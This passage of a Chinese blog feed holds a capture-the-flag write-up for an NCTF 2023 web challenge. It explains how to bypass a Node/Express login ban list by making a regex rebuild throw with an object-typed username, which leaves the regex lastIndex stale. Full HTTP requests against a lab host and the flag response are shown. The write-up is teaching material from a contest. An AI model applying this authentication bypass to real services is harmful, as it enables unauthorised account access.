class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test1&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test1) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第一个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 基于in关键字的封禁用户匹配系统的设计与实现</span></span><br><span class="line">    <span class="keyword">let</span> test2 = (username <span class="keyword">in</span> banned_users)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`使用in关键字匹配<span class="subst">$&#123;username&#125;</span>的结果为：<span class="subst">$&#123;test2&#125;</span>`</span>)</span><br><span class="line">    <span class="keyword">if</span> (test2)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;第二个判断匹配到封禁用户：&quot;</span>,username)</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;用户&#x27;&quot;</span>+username + <span class="string">&quot;&#x27;被封禁，无法鉴权！&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (username <span class="keyword">in</span> users &amp;&amp; users[username] === password) &#123;</span><br><span class="line">        <span class="title function_">next</span>()    #####</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;用户名或密码错误，鉴权失败！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们需要设法执行到<code>next()</code>才能通过鉴权</p><p>当然,要得到flag, 必须是以admin通过鉴权才行</p><p>阅读代码,需要完成两件事</p><ol><li>admin用户被ban,(被psuh进了<code>banned_users</code>)需要设法绕过限制</li><li>admin的密码不得而知,或许需要通过某种方法bypass</li></ol><p><strong>对于admin的封禁,用了两层waf</strong></p><p>分别是:</p><ol><li>每次请求前生成的正则来匹配封禁的username</li><li>通过<code>in</code>关键字来检查请求的username是否存在于<code>banned_users</code>中</li></ol><p>看了wp,绕过正则还是比较复杂(对我来说qwq)</p><p><strong>先看看in关键字实现的waf吧:</strong></p><p>在这里可以看见官方对<code>in</code>的一些解释(wp说的)</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/in</a></p><p>可以看见</p><p><code>in</code>关键字实现的是 检查某属性是否存在于指定对象的原型链中</p><p>一个栗子:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703779559576.png" alt="1703779559576"></p><p>因此,这个waf实际上是没有起到什么作用的</p><p>接下来看看正则</p><p>wp中指出这里由于使用了全局匹配标志<code>g</code>使得下一次匹配的开始会紧接着上一次匹配的位置</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1703827190486.png" alt="1703827190486"></p><p>但是每次请求前都会重新生成一个新的<code>banned_users_regex</code>时lastIndex归为0</p><p>但有趣的是,在每次生成时都使用了try catch关键字</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">use</span>(<span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">build_banned_users_regex</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;封禁用户正则表达式（满足这个正则表达式的用户名为被封禁用户名）：&quot;</span>,banned_users_regex)</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">next</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们就可以设法让其抛出异常来避免执行<code>build_banned_users_regex()</code>以重新生成<code>banned_users_regex</code></p><p>故而astIndex也就不会归为0</p><p><strong>该如何致使其抛出异常呢?</strong></p><p>不知道,问问gpt</p><blockquote><p>gpt:<br>在提供的代码中，<code>try</code> 块包含对 <code>build_banned_users_regex()</code> 函数的调用。<code>try</code> 块本身并不包含明确抛出异常的代码。然而，在 <code>build_banned_users_regex()</code> 函数或其调用的函数内部可能会抛出异常。</p><p>可能导致异常的情况：</p><ol><li><strong>banned_users 未定义或为空:</strong> 如果 <code>banned_users</code> 数组未定义或为空，<code>build_banned_users_regex()</code> 函数中的 <code>for (let username of banned_users)</code> 循环将不会运行，并且尝试访问未定义的元素可能导致异常。</li><li><strong>escapeRegExp 函数问题:</strong> 如果 <code>escapeRegExp</code> 函数未定义或存在问题，调用时可能会导致异常。</li><li><strong>正则表达式创建问题:</strong> 如果正则表达式字符串格式不正确，或包含在正则表达式中无效的字符，<code>new RegExp()</code> 构造函数可能会抛出异常。</li></ol><p>为了提供更具体的答案，您需要检查 <code>escapeRegExp</code> 函数的实现，并确保 <code>banned_users</code> 数组被正确定义并包含有效数据。如果其中任何元素缺失或不正确，可能会导致异常。</p></blockquote><p>可以看见,1,3所说的都不可能出现,因为正则表达式和banned_users在代码中已经生成好了</p><p>只剩下了<code>escapeRegExp 函数问题</code>,这也正是wp中所指出的</p><p>以下是代码中定义的<code>escapeRegExp()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">escapeRegExp</span>(<span class="params">string</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> string.<span class="title function_">replace</span>(<span class="regexp">/[.*+?^$&#123;&#125;()|[\]\\]/g</span>, <span class="string">&#x27;\\$&amp;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里需要使用__string__类型下的__replace属性__,如果传入了其他类型而找不到replace这个属性,那么就会报错,从而抛出异常</p><p>综上,我们依次要做:</p><ol><li>构造一个用户名将其封禁,使得每次生成regexp时抛出异常</li><li>首先鉴权admin使得lastIndex指向末尾</li><li>再次鉴权admin,正则匹配admin失败,成功通过鉴权</li></ol><p>poc0:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/register</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8082</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8082/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>37</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.26:8082</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>poc1:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/ban_user</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8082</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8082/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.26:8082</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;nacl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;ban_username&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;toString&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>这里构造了一个ban_username为<code>&#123;&quot;toString&quot;:&quot;&quot;&#125;</code></p><p>刚开始有点疑惑,经过测试,发现这并不是必要的,我们也可以直接传入一个<code>&#123;&#125;</code>,这在js中会被认为是一个对象而不是一个string,从而使得上面提到的escapeRegExp(string)抛出一个错误(因为它只能传入一个string)</p><p>poc2:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/api/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.1.26:8082</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.1.26:8082/</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>39</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.1.26:8082</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>首先发送一次poc1,之后发送两次poc2即可得到flag,当然,如你所见这里的admin存在弱密码</p><p>第二次发送poc2后回包中有flag:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>Express</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Fri, 29 Dec 2023 12:06:12 GMT</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>49</span><br><span class="line"></span><br><span class="line"><span class="language-roboconf">flag&#123;<span class="attribute">https</span>://www<span class="variable">.youtube</span><span class="variable">.com</span>/watch?v=dQw4w9WgXcQ&#125;</span></span><br></pre></td></tr></table></figure><p>To be continued…</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NCTF 2023 Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
